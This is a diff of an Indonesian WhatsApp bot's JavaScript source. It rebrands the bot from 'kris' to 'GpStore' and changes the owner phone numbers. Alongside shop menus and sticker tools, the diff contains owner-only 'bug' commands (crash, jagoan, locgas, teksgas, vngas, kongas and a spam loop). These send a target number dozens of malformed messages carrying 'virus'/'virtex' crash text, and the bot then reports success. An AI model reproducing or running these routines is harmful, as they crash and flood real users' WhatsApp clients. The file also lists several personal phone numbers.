-owned = '62882007324217@s.whatsapp.net'
+owned = '62858428854987@s.whatsapp.net'
 ngen = `
 Title : ${anu.title}
 Ext : Search
@@ -1667,7 +1667,7 @@ contextInfo: {
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }}
 }
-kris.sendMessage(m.chat, buttonMessages, { quoted: {
+GpStore.sendMessage(m.chat, buttonMessages, { quoted: {
 key: {
 fromMe: false,
 participant: `0@s.whatsapp.net`,
@@ -1678,7 +1678,7 @@ orderMessage: {
 itemCount: 99999999,
 status: 1,
 surface: 1,
-message: 'Created By kris',
+message: 'Created By GpStore',
 orderTitle: '999999999', 
 sellerJid: `0@s.whatsapp.net` 
 }
@@ -1697,7 +1697,7 @@ downloadMp3(text)
 }
 break
 case 'allmenu':{
-kris.sendMessage(from,{image:thumb, caption:`Hai Kak @${sender.split("@")[0]}
+GpStore.sendMessage(from,{image:thumb, caption:`Hai Kak @${sender.split("@")[0]}
 
 𝗕𝘆 𝗚𝘂𝘀𝘁𝗶 𝗣𝗮𝗻𝗲𝗻𝗴𝗮𝗵
 
@@ -1772,7 +1772,7 @@ kris.sendMessage(from,{image:thumb, caption:`Hai Kak @${sender.split("@")[0]}
 }
 break
 case 'saldoewallet':{
-kris.sendMessage(from,{image:saldo, caption:`Hai Kak @${sender.split("@")[0]}
+GpStore.sendMessage(from,{image:saldo, caption:`Hai Kak @${sender.split("@")[0]}
 
 𝗦𝗜𝗟𝗔𝗛𝗞𝗔𝗡 𝗗𝗜 𝗣𝗜𝗟𝗜𝗛
 Minat? wa.me/6281390368580
@@ -1795,14 +1795,14 @@ Minat? wa.me/6281390368580
 }
 break
 case 'bayarqris':{
-kris.sendMessage(from,{image:qrisdonate, caption:`Hai Kak @${sender.split("@")[0]}
+GpStore.sendMessage(from,{image:qrisdonate, caption:`Hai Kak @${sender.split("@")[0]}
 
 Sɪʟᴀʜᴋᴀɴ Sᴄᴀɴ Qʀɪs Dɪ Aᴛᴀs Uɴᴛᴜᴋ Bᴀʏᴀʀ Dᴀɴ Kɪʀɪᴍ Bᴜᴋᴛɪ Tғ Kᴇ Aᴅᴍɪɴ
-https://wa.me/62882007324217 .`, mentions: [sender]},{quoted:m})
+https://wa.me/62858428854987 .`, mentions: [sender]},{quoted:m})
 }
 break
 case 'diamondff':{
-kris.sendMessage(from,{image:freefire, caption:`Hai Kak @${sender.split("@")[0]}
+GpStore.sendMessage(from,{image:freefire, caption:`Hai Kak @${sender.split("@")[0]}
 
 𝗦𝗜𝗟𝗔𝗛𝗞𝗔𝗡 𝗗𝗜 𝗣𝗜𝗟𝗜𝗛
 Minat? wa.me/6281390368580
@@ -1825,7 +1825,7 @@ Minat? wa.me/6281390368580
 }
 break
 case 'diamondml':{
-kris.sendMessage(from,{image:ml, caption:`Hai Kak @${sender.split("@")[0]}
+GpStore.sendMessage(from,{image:ml, caption:`Hai Kak @${sender.split("@")[0]}
 
 𝗦𝗜𝗟𝗔𝗛𝗞𝗔𝗡 𝗗𝗜 𝗣𝗜𝗟𝗜𝗛
 Minat? wa.me/6281390368580
@@ -1853,7 +1853,7 @@ Minat? wa.me/6281390368580
 }
 break
 case 'diamondpubg':{
-kris.sendMessage(from,{image:pubg, caption:`Hai Kak @${sender.split("@")[0]}
+GpStore.sendMessage(from,{image:pubg, caption:`Hai Kak @${sender.split("@")[0]}
 
 𝗦𝗜𝗟𝗔𝗛𝗞𝗔𝗡 𝗗𝗜 𝗣𝗜𝗟𝗜𝗛
 Minat? wa.me/6281390368580
@@ -1878,7 +1878,7 @@ Minat? wa.me/6281390368580
 }
 break
 case 'diamondcalof':{
-kris.sendMessage(from,{image:calof, caption:`Hai Kak @${sender.split("@")[0]}
+GpStore.sendMessage(from,{image:calof, caption:`Hai Kak @${sender.split("@")[0]}
 
 𝗦𝗜𝗟𝗔𝗛𝗞𝗔𝗡 𝗗𝗜 𝗣𝗜𝗟𝗜𝗛
 Minat? wa.me/6281390368580
@@ -1903,7 +1903,7 @@ Minat? wa.me/6281390368580
 }
 break
 case 'buypulsa':{
-kris.sendMessage(from,{image:pulsa, caption:`Hai Kak @${sender.split("@")[0]}
+GpStore.sendMessage(from,{image:pulsa, caption:`Hai Kak @${sender.split("@")[0]}
 
 ❍ 𝗣𝗨𝗟𝗦𝗔 𝗡𝗔𝗦𝗜𝗢𝗡𝗔𝗟
 𝙼𝚒𝚗𝚊𝚝? wa.me/6281390368580
@@ -1925,7 +1925,7 @@ kris.sendMessage(from,{image:pulsa, caption:`Hai Kak @${sender.split("@")[0]}
 }
 break
 case 'suntiktiktok':{
-kris.sendMessage(from,{image:thumb, caption:`Hai Kak @${sender.split("@")[0]}
+GpStore.sendMessage(from,{image:thumb, caption:`Hai Kak @${sender.split("@")[0]}
 
 𝗝𝗔𝗦𝗔 𝗦𝗨𝗡𝗧𝗜𝗞 𝗧𝗜𝗞 𝗧𝗢𝗞
 Minat? wa.me/6281390368580
@@ -1969,7 +1969,7 @@ Minat? wa.me/6281390368580
 }
 break
 case 'suntikig':{
-kris.sendMessage(from,{image:thumb, caption:`Hai Kak @${sender.split("@")[0]}
+GpStore.sendMessage(from,{image:thumb, caption:`Hai Kak @${sender.split("@")[0]}
 
 𝗝𝗔𝗦𝗔 𝗦𝗨𝗡𝗧𝗜𝗞 𝗜𝗦𝗧𝗔𝗚𝗥𝗔𝗠
 Minat? wa.me/6281390368580
@@ -2013,18 +2013,18 @@ Minat? wa.me/6281390368580
 }
 break
 case 'addprem':
-if (!itsMekris) return reply(mess.owner)
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62882007324217`)
+if (!itsMeGpStore) return reply(mess.owner)
+if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62858428854987`)
 prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
-let ceknya = await kris.onWhatsApp(prrkek)
+let ceknya = await GpStore.onWhatsApp(prrkek)
 if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
 prem.push(prrkek)
 fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
 reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
 break
 case 'delprem':
-if (!itsMekris) return reply(mess.owner)
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62882007324217`)
+if (!itsMeGpStore) return reply(mess.owner)
+if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62858428854987`)
 ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
 unp = prem.indexOf(ya)
 prem.splice(unp, 1)
@@ -2032,10 +2032,10 @@ fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
 reply(`Nomor ${ya} Telah Di Hapus Premium!`)
 break
 case 'addvn':{
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 if (args.length < 1) return reply('Nama audionya apa')
 if (vnnye.includes(q)) return reply("Nama tersebut sudah di gunakan")
-let delb = await kris.downloadAndSaveMediaMessage(quoted)
+let delb = await GpStore.downloadAndSaveMediaMessage(quoted)
 vnnye.push(q)
 await fsx.copy(delb, `./database/Audio/${q}.mp3`)
 fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
@@ -2044,7 +2044,7 @@ reply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
 }
 break
 case 'delvn':{
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 if (args.length < 1) return reply('Masukan query')
 if (!vnnye.includes(q)) return reply("Nama tersebut tidak ada di dalam data base")
 let wanu = vnnye.indexOf(q)
@@ -2064,18 +2064,18 @@ reply(teks)
 }
 break
 case 'addowner':
-if (!itsMekris) return reply(mess.owner)
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62882007324217`)
+if (!itsMeGpStore) return reply(mess.owner)
+if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62858428854987`)
 bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
-let ceknye = await kris.onWhatsApp(bnnd + `@s.whatsapp.net`)
+let ceknye = await GpStore.onWhatsApp(bnnd + `@s.whatsapp.net`)
 if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
 owner.push(bnnd)
 fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
 reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
 break
 case 'delowner':
-if (!itsMekris) return reply(mess.owner)
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62882007324217`)
+if (!itsMeGpStore) return reply(mess.owner)
+if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62858428854987`)
 ya = q.split("|")[0].replace(/[^0-9]/g, '')
 unp = owner.indexOf(ya)
 owner.splice(unp, 1)
@@ -2084,21 +2084,21 @@ reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
 break
 case 'listpremium':
 teks = '*List Premium*\n\n'
-for (let kris of prem) {
-teks += `- ${kris}\n`
+for (let GpStore of prem) {
+teks += `- ${GpStore}\n`
 }
 teks += `\n*Total : ${prem.length}*`
-kris.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
+GpStore.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
 break
 case 'setppbot': {
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 if (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
 if (!/image/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
 if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
-var medis = await kris.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
+var medis = await GpStore.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
 if (args[0] == `/kay`) {
 var { img } = await generateProfilePicture(medis)
-await kris.query({
+await GpStore.query({
 tag: 'iq',
 attrs: {
 to: botNumber,
@@ -2116,7 +2116,7 @@ content: img
 fs.unlinkSync(medis)
 reply(`Sukses`)
 } else {
-var memeg = await kris.updateProfilePicture(botNumber, { url: medis })
+var memeg = await GpStore.updateProfilePicture(botNumber, { url: medis })
 fs.unlinkSync(medis)
 reply(`Sukses`)
 }
@@ -2137,24 +2137,24 @@ rowId: x.key
 }
 const listMessageNya = {
 text: `Hai Kak ${pushname}\n\nBerikut Adalah List Item\nSilahkan Pilih Salah Satu!!!\n${tanggal(new Date())}\n🕰 Jam : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} WIB`,
-footer: "List By kris",
+footer: "List By GpStore",
 buttonText: "Click Here",
 sections: [{
 title: groupName, rows: arr_rows
 }],
 listType: 1
 }
-const sendMsge = await kris.sendMessage(from, listMessageNya)
+const sendMsge = await GpStore.sendMessage(from, listMessageNya)
 break
 case 'addlist':
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 if (!m.isGroup) return reply(mess.group)
 var args1 = text.split("@")[0]
 var args2 = text.split("@")[1]    
 if (!q.includes("@")) return reply(`Gunakan dengan cara ${prefix+command.slice(0)} *Nama Item@Item*\n\n_Contoh_\n\n${prefix+command.slice(0)} namalist@List`)
 if (isAlreadyResponList(from, args1, db_respon_list)) return reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
 if (/image/.test(mime)) {
-media = await kris.downloadAndSaveMediaMessage(quoted)
+media = await GpStore.downloadAndSaveMediaMessage(quoted)
 mem = await uptotelegra(media)
 addResponList(from, args1, args2, true, `${mem}`, db_respon_list)
 reply(`Sukses set list message dengan key : *${args1}*`)
@@ -2165,7 +2165,7 @@ reply(`Sukses Add List Dengan Kunci : *${args1}*`)
 }
 break
 case 'dellist':
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 if (!m.isGroup) return reply(mess.group)
 if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
 if (!q) return reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item*\n\n_Contoh_\n\n${command.slice(1)} namalist`)
@@ -2174,14 +2174,14 @@ delResponList(from, q, db_respon_list)
 reply(`Sukses delete list message dengan key *${q}*`)
 break
 case 'updatelist':
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 if (!m.isGroup) return reply(mess.group)
 var args1 = q.split("@")[0]
 var args2 = q.split("@")[1]
 if (!q.includes("@")) return reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item@Item*\n\n_Contoh_\n\n${command.slice(1)} namalist@List`)
 if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
 if (/image/.test(mime)) {
-media = await kris.downloadAndSaveMediaMessage(quoted)
+media = await GpStore.downloadAndSaveMediaMessage(quoted)
 mem = await uptotelegra(media)
 updateResponList(from, args1, args2, true, `${mem}`, db_respon_list)
 reply(`Sukses update list message dengan key : *${args1}*`)
@@ -2194,8 +2194,8 @@ break
 case 'snobg': {
 if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
 if (/image/.test(mime)) {
-let media = await kris.downloadAndSaveMediaMessage(quoted)
-let encmedia = await kris.sendImageAsSticker(m.chat, await rmbg(media), m, { packname: global.packname, author: global.author })
+let media = await GpStore.downloadAndSaveMediaMessage(quoted)
+let encmedia = await GpStore.sendImageAsSticker(m.chat, await rmbg(media), m, { packname: global.packname, author: global.author })
 await fs.unlinkSync(encmedia)
 } else {
 reply(`Kirim/Reply Gambar Dengan Caption ${prefix+command}`)
@@ -2205,9 +2205,9 @@ break
 case 'tourl':
 try {
 if (!isMedia) return reply(`Kirim/Reply Foto/Vi Dengan Caption ${prefix + command}`)
-mee = await kris.downloadAndSaveMediaMessage(quoted)
+mee = await GpStore.downloadAndSaveMediaMessage(quoted)
 mem = await uptotelegra(mee)
-kris.sendMessage(m.chat, {text:mem},{quoted:m})
+GpStore.sendMessage(m.chat, {text:mem},{quoted:m})
 } catch (err) {
 reply(`Reply Image Nya Bang`)
 }
@@ -2223,40 +2223,40 @@ case 'gay':
 case 'jail':
 try {
 if (!isMedia) return reply(`Kirim/Reply Foto/Vi Dengan Caption ${prefix + command}`)
-meeh = await kris.downloadAndSaveMediaMessage(quoted)
+meeh = await GpStore.downloadAndSaveMediaMessage(quoted)
 memh = await uptotelegra(meeh)
 gdye = await getBuffer(`https://some-random-api.ml/canvas/${command}?avatar=${memh}`)
-kris.sendImageAsSticker(m.chat, gdye, m, { packname: global.packname, author: global.author })
+GpStore.sendImageAsSticker(m.chat, gdye, m, { packname: global.packname, author: global.author })
 } catch (err) {
 reply(`Reply Image Nya Bang`)
 }
 break
 case 'tovn':
 if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
-mee = await kris.downloadAndSaveMediaMessage(quoted)
+mee = await GpStore.downloadAndSaveMediaMessage(quoted)
 mem = await uptotelegra(mee)
-kris.sendMessage(m.chat, { audio: { url: mem }, mimetype: 'audio/mp4', ptt:true, mentions:[m.sender]}, { quoted: m })
+GpStore.sendMessage(m.chat, { audio: { url: mem }, mimetype: 'audio/mp4', ptt:true, mentions:[m.sender]}, { quoted: m })
 break
 case 'toaudio':
 if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply the Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
-mee = await kris.downloadAndSaveMediaMessage(quoted)
+mee = await GpStore.downloadAndSaveMediaMessage(quoted)
 mem = await uptotelegra(mee)
-kris.sendMessage(m.chat, { audio: { url: mem }, mimetype: 'audio/mp4', ptt:false, mentions:[m.sender]}, { quoted: m })
+GpStore.sendMessage(m.chat, { audio: { url: mem }, mimetype: 'audio/mp4', ptt:false, mentions:[m.sender]}, { quoted: m })
 break
 case 'tomp3':
 if (/document/.test(mime)) return reply(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
 if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
-mee = await kris.downloadAndSaveMediaMessage(quoted)
+mee = await GpStore.downloadAndSaveMediaMessage(quoted)
 mem = await uptotelegra(mee)
-kris.sendMessage(m.chat, { document: {url:mem}, mimetype: 'audio/mpeg', fileName: `Convert By ${pushname}.mp3`, jpegThumbnail: ppnyaimg, mentions:[sender] }, {quoted:m})
+GpStore.sendMessage(m.chat, { document: {url:mem}, mimetype: 'audio/mpeg', fileName: `Convert By ${pushname}.mp3`, jpegThumbnail: ppnyaimg, mentions:[sender] }, {quoted:m})
 break
 case 'smeme':
 if (!q) return reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
 if (!isMedia) return reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
-mee = await kris.downloadAndSaveMediaMessage(quoted)
+mee = await GpStore.downloadAndSaveMediaMessage(quoted)
 mem = await uptotelegra(mee)
 kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${q}.png?background=${mem}`)
-kris.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author })
+GpStore.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author })
 break
 case 'cekme':
 					neme = args.join(" ")
@@ -2300,17 +2300,17 @@ case 'cekme':
 
 *≡═════�? CEKSIFATME 》═════�?*`
 					buff = await getBuffer(ppimg)
-kris.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
+GpStore.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
 break
 case 'toimg': {
 if (!/webp/.test(mime)) return reply(`balas stiker dengan caption *${prefix+command}*`)
-let media = await kris.downloadAndSaveMediaMessage(quoted)
+let media = await GpStore.downloadAndSaveMediaMessage(quoted)
 let ran = await getRandom('.png')
 exec(`ffmpeg -i ${media} ${ran}`, (err) => {
 fs.unlinkSync(media)
 if (err) throw err
 let buffer = fs.readFileSync(ran)
-kris.sendMessage(m.chat, { image: buffer, jpegThumbnail: ppnyaimg, 
+GpStore.sendMessage(m.chat, { image: buffer, jpegThumbnail: ppnyaimg, 
 contextInfo: {
 "mentionedJid": [sender],
 "externalAdReply": {
@@ -2333,12 +2333,12 @@ case 's': {
 if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
 if (/image/.test(mime)) {
 let media = await quoted.download()
-let encmedia = await kris.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
+let encmedia = await GpStore.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
 await fs.unlinkSync(encmedia)
 } else if (/video/.test(mime)) {
 if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
 let media = await quoted.download()
-let encmedia = await kris.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
+let encmedia = await GpStore.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
 await fs.unlinkSync(encmedia)
 } else {
 reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
@@ -2386,7 +2386,7 @@ case 'piatu':
 if (!m.isGroup) return reply(mess.group)
 let member = participants.map((u) => u.id)
 let org = member[Math.floor(Math.random() * member.length)]
-kris.sendMessage(from, { text: `anak ${command} di sini adalah @${org.split('@')[0]}`, mentions: [org] }, { quoted: m })
+GpStore.sendMessage(from, { text: `anak ${command} di sini adalah @${org.split('@')[0]}`, mentions: [org] }, { quoted: m })
 }
 break
 case 'goblokcek':
@@ -2452,11 +2452,11 @@ if (!m.isGroup) return reply(mess.group)
 const cex = body.slice(0)
 const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
 if (mentionByReply) {
-kris.sendMessage(from, { text: 'Pertanyaan : *' + cex + '*\nNomer : ' + `@${mentionByReply.split('@')[0]}` + '\nJawaban : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
+GpStore.sendMessage(from, { text: 'Pertanyaan : *' + cex + '*\nNomer : ' + `@${mentionByReply.split('@')[0]}` + '\nJawaban : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
 } else if (mentionByTag[0] && isGroup) {
-kris.sendMessage(from, { text: 'Pertanyaan : *' + cex + '*\nNomer : ' + `@${mentionByTag[0].split('@')[0]}` + '\nJawaban : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
+GpStore.sendMessage(from, { text: 'Pertanyaan : *' + cex + '*\nNomer : ' + `@${mentionByTag[0].split('@')[0]}` + '\nJawaban : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
 } else if (!mentionByReply && !mentionByTag[0]) {
-kris.sendMessage(from, { text: 'Pertanyaan : *' + cex + '*\nNomer : ' + `@${sender.split('@')[0]}` + '\nJawaban : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
+GpStore.sendMessage(from, { text: 'Pertanyaan : *' + cex + '*\nNomer : ' + `@${sender.split('@')[0]}` + '\nJawaban : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
 }
 break
 case 'cekbapak':
@@ -2478,10 +2478,10 @@ reply(util.format(res))
 }
 break
 case 'vote': {
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "pollCreationMessage": {
-"name": "HALO SAYA kris BOT",
+"name": "HALO SAYA GpStore BOT",
 "options": [
 	{
 "optionName": "KATANYA WA KEBAL"
@@ -2496,13 +2496,13 @@ var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject
 "optionName": "KATANYA KEBAL"
 	},
 	{
-"optionName": "SALAM DARI kris BOT"
+"optionName": "SALAM DARI GpStore BOT"
 	}
 ],
 "selectableOptionsCount": 5
 	}
 }), { userJid: m.chat, quoted: crsh })
-kris.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
+GpStore.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
 reply(mess.succes)
 }
 break
@@ -2511,18 +2511,18 @@ if (!q) return reply(`Penggunaan ${prefix+command} 6285842107854`)
 num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 jumlah = '30'
 for (let i = 0; i < jumlah; i++) {
-kris.sendMessage(num,{text:`hai`},{quoted:lep})
+GpStore.sendMessage(num,{text:`hai`},{quoted:lep})
 await sleep(1000)
 }
 reply(`Sukses Send Bug Ke Nomor ${q} Sebanyak ${jumlah}`)
 }
 break
 case 'crash':{
-if (!itsMekris) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62882007324217`)
+if (!itsMeGpStore) return reply(mess.owner)
+if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62858428854987`)
 jumlah = '15'
 for (let i = 0; i < jumlah; i++) {
-kris.sendMessage(`${q}`.split("-").join("").split(" ").join("").replace("+", "")+"@s.whatsapp.net", {sticker: ppnyaimg},{quoted: {
+GpStore.sendMessage(`${q}`.split("-").join("").split(" ").join("").replace("+", "")+"@s.whatsapp.net", {sticker: ppnyaimg},{quoted: {
 key: { 
 fromMe: false, 
 participant: `0@s.whatsapp.net`, 
@@ -2550,23 +2550,23 @@ reply(`Sukses Send Bug Ke Nomor ${q} Sebanyak ${jumlah}`)
 }
 break
 case 'jagoan' : {
-if (!itsMekris) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62882007324217`)
-kris.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { 
+if (!itsMeGpStore) return reply(mess.owner)
+if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62858428854987`)
+GpStore.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { 
 requestmentMessage: { 
 Message: { 
 extendedTextMessage: { 
-text: 'Hai Aku kris', 
+text: 'Hai Aku GpStore', 
 currencyCodeIso4217: 'IDR', 
 requestFrom: '0@s.whatsapp.net', 
 expiryTimestamp: 8000, 
 amount: 1, 
 contextInfo:{
 "externalAdReply": {
-"title": `kris Bot ${virus}${virtex(prefix)}`,
-"body": `kris Bot ${virus}${virtex(prefix)}`,
+"title": `GpStore Bot ${virus}${virtex(prefix)}`,
+"body": `GpStore Bot ${virus}${virtex(prefix)}`,
 mimetype: 'audio/mpeg', 
-caption: `kris Bot WhatsApp${ngazap(prefix)}`,
+caption: `GpStore Bot WhatsApp${ngazap(prefix)}`,
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
 thumbnailUrl: ppnyaimg, 
@@ -2577,22 +2577,22 @@ await sleep(1000)
 }
 break
 case 'jagoanneon' : {
-if (!itsMekris) return reply(mess.owner)
-kris.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : m.chat, { 
+if (!itsMeGpStore) return reply(mess.owner)
+GpStore.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : m.chat, { 
 requestmentMessage: { 
 Message: { 
 extendedTextMessage: { 
-text: `kris Bot ${virus}${virtex(prefix)}`, 
+text: `GpStore Bot ${virus}${virtex(prefix)}`, 
 currencyCodeIso4217: 'IDR', 
 requestFrom: '0@s.whatsapp.net', 
 expiryTimestamp: 8000, 
 amount: 1, 
 contextInfo:{
 "externalAdReply": {
-"title": `kris Bot`,
+"title": `GpStore Bot`,
 "body": `Masih Bawahan`,
 mimetype: 'audio/mpeg', 
-caption: `kris Bot WhatsApp${ngazap(prefix)}`,
+caption: `GpStore Bot WhatsApp${ngazap(prefix)}`,
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
 thumbnailUrl: ppnyaimg, 
@@ -2603,41 +2603,41 @@ await sleep(1000)
 }
 break
 case 'locgas':{
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-var messa = await prepareWAMessageMedia({ image: ppnyaimg }, { upload: kris.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: ppnyaimg }, { upload: GpStore.waUploadToServer })
 var liveLocation = generateWAMessageFromContent(num, proto.Message.fromObject({
 "liveLocationMessage": {
 "degreesLatitude": -6.9367014,
 "degreesLongitude": 107.7228574,
-"name": `kris Bot ${virus}${virtex(prefix)}`,
+"name": `GpStore Bot ${virus}${virtex(prefix)}`,
 "url": "https://foursquare.com/v/58245afd7c74e13e299229d9",
-"caption": `kris Bot ${virus}${virtex(prefix)}`,
+"caption": `GpStore Bot ${virus}${virtex(prefix)}`,
 "sequenceNumber": "1657237469254001",
 "jpegThumbnail": messa.imageMessage,
 "mtype": "locationMessage"
 }
 }), { userJid: num, quoted: lep })
-kris.relayMessage(num, liveLocation.message, { messageId: liveLocation.key.id })
+GpStore.relayMessage(num, liveLocation.message, { messageId: liveLocation.key.id })
 await sleep(1000)
 }
 reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 }
 break
 case 'teksgas':{
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-kris.relayMessage(num, {
+GpStore.relayMessage(num, {
 requestmentMessage: { 
 Message: { 
 extendedTextMessage: { 
-text: `kris Bot ${virus}${virtex(prefix)}`, 
+text: `GpStore Bot ${virus}${virtex(prefix)}`, 
 currencyCodeIso4217: 'IDR', 
 requestFrom: '0@s.whatsapp.net', 
 expiryTimestamp: 8000, 
@@ -2649,38 +2649,38 @@ reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 }
 break
 case 'vngas':{
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-kris.sendMessage(num, { audio: audionye, mimetype: 'audio/mp4', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
+GpStore.sendMessage(num, { audio: audionye, mimetype: 'audio/mp4', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
 await sleep(1000)
 }
 reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 }
 break
 case 'kongas':{
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
